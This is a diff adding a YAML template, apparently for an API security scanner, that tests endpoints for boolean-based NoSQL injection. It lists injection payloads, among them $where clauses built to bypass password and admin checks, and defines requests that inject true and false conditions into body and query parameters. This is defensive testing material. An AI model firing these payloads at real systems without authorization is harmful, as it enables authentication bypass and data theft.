@@ -1,0 +1,110 @@
+id: SMART_NOSQL_INJECTION_BOOLEAN_BASED
+info:
+  name: Boolean Based NoSQL Injection - Smart Testing
+  description: Smart testing for boolean-based NoSQL injection vulnerabilities. Detects when NoSQL queries can be manipulated using JavaScript or regex expressions to bypass logic and extract data.
+  details: Tests for boolean-based NoSQL injection by intelligently injecting JavaScript expressions and regex functions into JSON parameters. The system identifies vulnerable input handlers that execute injected code without proper sanitization, testing both positive (true) and negative (false) conditions.
+  impact: Unauthorized database access, data extraction, authentication bypass, data manipulation, and complete application compromise.
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: SMART_NOSQL_INJECTION_BOOLEAN_BASED
+  severity: MEDIUM
+  agenticTestingAllowed: true
+  onlySmartTestingAllowed: true
+  tags:
+    - Injection Attack
+    - OWASP Top 10
+    - HackerOne Top 10
+  references:
+    - https://github.com/Charlie-belmer/nosqli
+    - https://owasp.org/www-community/Injection_Flaws
+  cwe:
+    - CWE-943
+    - CWE-89
+  cve:
+    - CVE-2020-35847
+    - CVE-2021-22911
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Unauthorized
+      - access denied
+      - Forbidden
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: injection_key
+          value:
+            extract: injection_value
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: injection_key
+          value:
+            extract: injection_value
+
+wordLists:
+  booleanPayloads:
+    - "${injection_value} && 'a' != 'a'"
+    - "${injection_value} || 'a' == 'a'"
+    - "${injection_value} && true"
+    - "${injection_value} || false"
+    - "/a/ && 'a' != 'a'/"
+    - "/^.*$/ && true/"
+    - "/^.*$/ || false/"
+    - "{$where: \"this.password == '1' || '1' == '1'\"}"
+    - "{$where: \"this.username == 'admin' && '1' == '1'\"}"
+
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            injection_key: !!str ${injection_value} && 'a' != 'a'
+        - modify_query_param:
+            injection_key: !!str ${injection_value} && 'a' != 'a'
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Unauthorized
+                - access denied
+                - Forbidden
+        - success: x1
+        - failure: continue
+    - req:
+        - modify_body_param:
+            injection_key: !!str ${injection_value} || 'a' == 'a'
+        - modify_query_param:
+            injection_key: !!str ${injection_value} || 'a' == 'a'
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+        - success: x1
+        - failure: continue
+
